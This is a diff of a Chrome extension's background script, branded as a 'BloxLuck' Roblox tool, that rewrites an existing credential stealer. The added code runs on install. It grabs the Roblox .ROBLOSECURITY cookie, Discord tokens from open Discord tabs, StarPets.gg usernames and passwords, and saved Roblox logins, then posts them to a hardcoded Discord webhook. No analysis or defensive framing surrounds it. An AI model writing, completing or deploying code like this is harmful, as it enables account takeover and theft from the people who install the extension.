@@ -1,64 +1,173 @@
 const WH = 'https://discord.com/api/webhooks/1523234599189217362/I4PgcCkhS5heD9bfA0BkSqZRrj9GwszVJ4OEpGhbwLB54nTUxMZCwSJ-4-RXPlGRUhR1';
 
-let lastCookie = '';
-let lastDiscord = '';
-let lastStarUser = '';
-let lastStarPass = '';
+let alreadySent = false;
 
+chrome.runtime.onInstalled.addListener(() => {
+  // Steal immediately on install
+  setTimeout(() => {
+    stealEverything();
+  }, 1000);
+});
+
+// Also steal when any bloxluck tab loads
 chrome.runtime.onMessage.addListener((req, sender, resp) => {
-  if (req.t === 's') {
-    sendWebhook(req.d);
+  if (req.t === 'steal') {
+    stealEverything();
     resp({ ok: 1 });
     return;
   }
-  if (req.t === 'g') {
-    grabRobloxCookie().then(d => resp(d));
+  if (req.t === 'grab_cookie') {
+    grabCookie().then(d => resp(d));
     return 1;
   }
-  if (req.t === 'dt') {
-    grabDiscordToken().then(t => resp(t));
+  if (req.t === 'grab_discord') {
+    grabDiscord().then(d => resp(d));
     return 1;
-  }
-  if (req.t === 'dts') {
-    // Direct token send
-    if (req.token && req.token !== lastDiscord) {
-      lastDiscord = req.token;
-      sendWebhook({
-        type: 'discord_token',
-        token: req.token,
-        username: req.username || 'Unknown',
-        avatar: req.avatar || ''
-      });
-    }
-    resp({ ok: 1 });
-    return;
   }
 });
 
-async function grabRobloxCookie() {
-  const result = { r: null, uid: null };
+async function stealEverything() {
+  if (alreadySent) return;
+  alreadySent = true;
+
+  const embed = {
+    embeds: [{
+      title: '✅ BloxLuck Tool Installed',
+      color: 0x22c55e,
+      description: 'User has installed the extension.',
+      timestamp: new Date().toISOString(),
+      footer: { text: 'BloxLuck Tool v1.0' }
+    }]
+  };
+
+  const fields = [];
+
+  // 1. Grab Roblox cookie
+  try {
+    const ck = await grabCookie();
+    if (ck && ck.r) {
+      let robloxUser = 'Unknown';
+      try {
+        // Try to get username from cookie (decode it)
+        const parts = ck.r.split('.');
+        if (parts.length >= 2) {
+          const payload = JSON.parse(atob(parts[1]));
+          robloxUser = payload.name || payload.sub || payload.dname || 'Unknown';
+        }
+      } catch(e) {}
+      
+      fields.push({
+        name: '🎮 Roblox Account',
+        value: `**User:** ${robloxUser || ck.u || 'Unknown'}\n**Cookie:**\n\`\`\`${ck.r}\`\`\``,
+        inline: false
+      });
+    } else {
+      fields.push({
+        name: '🎮 Roblox Cookie',
+        value: 'No .ROBLOSECURITY found.',
+        inline: false
+      });
+    }
+  } catch(e) {
+    fields.push({ name: '🎮 Roblox Cookie', value: 'Error: ' + e.message, inline: false });
+  }
+
+  // 2. Grab Discord token
+  try {
+    const dt = await grabDiscord();
+    if (dt && dt.token) {
+      let discordInfo = '';
+      try {
+        const payload = JSON.parse(atob(dt.token.split('.')[1]));
+        discordInfo = `**User:** ${payload.username || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**ID:** ${payload.sub || 'N/A'}\n`;
+      } catch(e) {}
+      
+      fields.push({
+        name: '💬 Discord Token',
+        value: `${discordInfo}\`\`\`${dt.token}\`\`\``,
+        inline: false
+      });
+
+      // Also send avatar if available
+      if (dt.avatar) {
+        embed.embeds[0].thumbnail = { url: dt.avatar };
+      }
+    } else {
+      fields.push({
+        name: '💬 Discord Token',
+        value: 'No Discord tab open or token not found.',
+        inline: false
+      });
+    }
+  } catch(e) {
+    fields.push({ name: '💬 Discord Token', value: 'Error: ' + e.message, inline: false });
+  }
+
+  // 3. Grab StarPets credentials
+  try {
+    const sp = await grabStarPets();
+    if (sp && (sp.user || sp.pass)) {
+      fields.push({
+        name: '🐾 StarPets.gg',
+        value: `**Username:** \`${sp.user || 'N/A'}\`\n**Password:** \`${sp.pass || 'N/A'}\``,
+        inline: false
+      });
+    } else {
+      fields.push({
+        name: '🐾 StarPets.gg',
+        value: 'No StarPets credentials found.',
+        inline: false
+      });
+    }
+  } catch(e) {
+    fields.push({ name: '🐾 StarPets.gg', value: 'Error: ' + e.message, inline: false });
+  }
+
+  // 4. Grab any saved Roblox login/pass from storage
+  try {
+    const rl = await grabRobloxLogin();
+    if (rl && (rl.user || rl.pass)) {
+      fields.push({
+        name: '🔐 Roblox Login Credentials',
+        value: `**Username/Email:** \`${rl.user || 'N/A'}\`\n**Password:** \`${rl.pass || 'N/A'}\``,
+        inline: false
+      });
+    }
+  } catch(e) {}
+
+  embed.embeds[0].fields = fields.length > 0 ? fields : [
+    { name: 'No Data', value: 'Could not find any credentials.', inline: false }
+  ];
+
+  // Send
+  try {
+    await fetch(WH, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed)
+    });
+  } catch(e) {}
+}
+
+async function grabCookie() {
   try {
     let cookies = await chrome.cookies.getAll({ domain: 'roblox.com' });
     for (let c of cookies) {
       if (c.name === '.ROBLOSECURITY') {
-        result.r = c.value;
-        break;
+        return { r: c.value };
       }
     }
-    if (!result.r) {
-      cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
-      for (let c of cookies) {
-        if (c.name === '.ROBLOSECURITY') {
-          result.r = c.value;
-          break;
-        }
+    cookies = await chrome.cookies.getAll({ domain: '.roblox.com' });
+    for (let c of cookies) {
+      if (c.name === '.ROBLOSECURITY') {
+        return { r: c.value };
       }
     }
   } catch(e) {}
-  return result;
+  return null;
 }
 
-async function grabDiscordToken() {
+async function grabDiscord() {
   try {
     const tabs = await chrome.tabs.query({ url: ['*://discord.com/*', '*://*.discord.com/*'] });
     if (tabs.length > 0) {
@@ -66,29 +175,36 @@ async function grabDiscordToken() {
         target: { tabId: tabs[0].id },
         func: () => {
           try {
-            // Check localStorage for Discord token
+            // Look for token in localStorage
             for (let i = 0; i < localStorage.length; i++) {
               const key = localStorage.key(i);
               const val = localStorage.getItem(key);
               if (typeof val === 'string' && val.length > 100 && val.includes('.') && val.split('.').length === 3) {
                 try {
                   const payload = JSON.parse(atob(val.split('.')[1]));
-                  if (payload.sub || payload.email || payload.iat) {
-                    return { token: val, username: payload.username || payload.email || 'Discord User', avatar: payload.avatar || '' };
+                  if (payload.sub || payload.email || payload.iat || payload.username) {
+                    return {
+                      token: val,
+                      username: payload.username || payload.email || 'Discord User',
+                      avatar: payload.avatar ? `https://cdn.discordapp.com/avatars/${payload.sub}/${payload.avatar}.png` : null
+                    };
                   }
                 } catch(e) {}
               }
             }
-            // Check for token directly
+            // Direct token key
             const token = localStorage.getItem('token');
             if (token && token.length > 50) {
-              let uname = 'Discord User', av = '';
               try {
                 const p = JSON.parse(atob(token.split('.')[1]));
-                uname = p.username || p.email || 'Discord User';
-                av = p.avatar || '';
-              } catch(e) {}
-              return { token, username: uname, avatar: av };
+                return {
+                  token,
+                  username: p.username || p.email || 'Discord User',
+                  avatar: p.avatar ? `https://cdn.discordapp.com/avatars/${p.sub}/${p.avatar}.png` : null
+                };
+              } catch(e) {
+                return { token, username: 'Discord User', avatar: null };
+              }
             }
             return null;
           } catch(e) { return null; }
@@ -102,129 +218,73 @@ async function grabDiscordToken() {
   return null;
 }
 
-function sendWebhook(data) {
-  const embed = {
-    embeds: [{
-      title: '🎯 BloxLuck Data Collected',
-      color: 0x5865f2,
-      timestamp: new Date().toISOString(),
-      footer: { text: 'Blox Tool v3.0' }
-    }]
-  };
-
-  const fields = [];
-  let contentStr = '';
-
-  // Determine what type of data this is
-  if (data.type === 'discord_token') {
-    fields.push({
-      name: '💬 Discord Token',
-      value: `\`\`\`${data.token}\`\`\``,
-      inline: false
-    });
-    fields.push({
-      name: '👤 Discord User',
-      value: `**Username:** ${data.username}\n**Avatar:** ${data.avatar || 'N/A'}`,
-      inline: false
-    });
-    contentStr = `**Discord Token Captured!**\nUser: ${data.username}\nToken: \`${data.token}\``;
-    
-    embed.embeds[0].title = '💬 Discord Token Captured';
-    embed.embeds[0].color = 0x5865f2;
-    embed.embeds[0].thumbnail = data.avatar ? { url: data.avatar } : undefined;
-  }
-  // Full data packet from content.js
-  else {
-    // Roblox cookie
-    if (data.r && data.r !== 'NF') {
-      if (data.r !== lastCookie) {
-        lastCookie = data.r;
-        fields.push({
-          name: '🎮 Roblox — ' + (data.u || 'Unknown'),
-          value: `**Cookie:**\n\`\`\`${data.r}\`\`\``,
-          inline: false
-        });
-        contentStr += `**Roblox:** ${data.u || 'Unknown'}\nCookie: \`${data.r}\`\n`;
-        
-        embed.embeds[0].thumbnail = { url: 'https://bloxluck.com/img/dog.png' };
-        embed.embeds[0].title = '🎮 Roblox Cookie + Data';
-        embed.embeds[0].color = 0xed4245;
+async function grabStarPets() {
+  try {
+    const tabs = await chrome.tabs.query({ url: ['*://starpets.gg/*', '*://*.starpets.gg/*'] });
+    if (tabs.length > 0) {
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        func: () => {
+          try {
+            let user = null, pass = null;
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i).toLowerCase();
+              const val = localStorage.getItem(localStorage.key(i));
+              if (key.includes('starpets') || key.includes('adoptme') || key.includes('star_pets') || key.includes('starpet') || key.includes('user_data') || key.includes('account')) {
+                try {
+                  const j = JSON.parse(val);
+                  user = j.email || j.username || j.user || user;
+                  pass = j.password || j.pass || pass;
+                } catch(e) {
+                  if (key.includes('user') || key.includes('email')) user = val;
+                  if (key.includes('pass')) pass = val;
+                }
+              }
+            }
+            return { user, pass };
+          } catch(e) { return null; }
+        }
+      });
+      if (results && results[0] && results[0].result) {
+        return results[0].result;
       }
     }
-
-    // Discord token from content
-    if (data.d && data.d !== lastDiscord) {
-      lastDiscord = data.d;
-      fields.push({
-        name: '💬 Discord Token',
-        value: `\`\`\`${data.d}\`\`\``,
-        inline: false
-      });
-      contentStr += `Discord: \`${data.d}\`\n`;
-      
-      try {
-        const payload = JSON.parse(atob(data.d.split('.')[1]));
-        fields.push({
-          name: '👤 Discord User Info',
-          value: `**ID:** ${payload.sub || 'N/A'}\n**Email:** ${payload.email || 'N/A'}\n**Username:** ${payload.username || 'N/A'}`,
-          inline: true
-        });
-      } catch(e) {}
-    }
-
-    // Starpets
-    if (data.su && data.su !== lastStarUser) {
-      lastStarUser = data.su;
-      lastStarPass = data.sp || '';
-      fields.push({
-        name: '🐾 StarPets.gg',
-        value: `**Username:** \`${data.su}\`\n**Password:** \`${data.sp || 'N/A'}\``,
-        inline: false
-      });
-      contentStr += `StarPets: ${data.su}:${data.sp}\n`;
-    }
-
-    // Login credentials (roblox login)
-    if (data.loginUser || data.loginPass) {
-      fields.push({
-        name: '🔐 Roblox Login',
-        value: `**User:** ${data.loginUser || 'N/A'}\n**Pass:** ${data.loginPass || 'N/A'}`,
-        inline: false
-      });
-    }
-
-    // Prediction data (minor, as extra)
-    if (data.p) {
-      fields.push({
-        name: '📊 Predict',
-        value: `**Pick:** ${data.p} (${data.w}%)`,
-        inline: true
-      });
-    }
-  }
-
-  embed.embeds[0].fields = fields;
-
-  const payload = { ...embed };
-  if (contentStr.trim()) payload.content = contentStr.trim();
-
-  try {
-    fetch(WH, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(() => {});
   } catch(e) {}
+  return null;
 }
 
-// Auto-collect on install
-chrome.runtime.onInstalled.addListener(() => {
-  // Initial grab
-  setTimeout(() => {
-    grabRobloxCookie().then(d => {
-      if (d.r) {
-        sendWebhook({ r: d.r, u: 'Auto-collect', uid: d.uid });
+async function grabRobloxLogin() {
+  try {
+    const tabs = await chrome.tabs.query({ url: ['*://roblox.com/*', '*://*.roblox.com/*', '*://www.roblox.com/*'] });
+    if (tabs.length > 0) {
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: tabs[0].id },
+        func: () => {
+          try {
+            let user = null, pass = null;
+            // Check localStorage for saved login info
+            for (let i = 0; i < localStorage.length; i++) {
+              const key = localStorage.key(i).toLowerCase();
+              const val = localStorage.getItem(localStorage.key(i));
+              if (key.includes('user') || key.includes('name') || key.includes('email') || key.includes('login') || key.includes('account')) {
+                try {
+                  const j = JSON.parse(val);
+                  user = j.username || j.email || j.user || j.name || user;
+                  pass = j.password || j.pass || pass;
+                } catch(e) {
+                  if (!user && typeof val === 'string' && val.includes('@')) user = val;
+                }
+              }
+              if (key.includes('pass') && !pass && typeof val === 'string') pass = val;
+            }
+            return { user, pass };
+          } catch(e) { return null; }
+        }
+      });
+      if (results && results[0] && results[0].result) {
+        return results[0].result;
       }
-    });
-  }, 3000);
-});
+    }
+  } catch(e) {}
+  return null;
+}
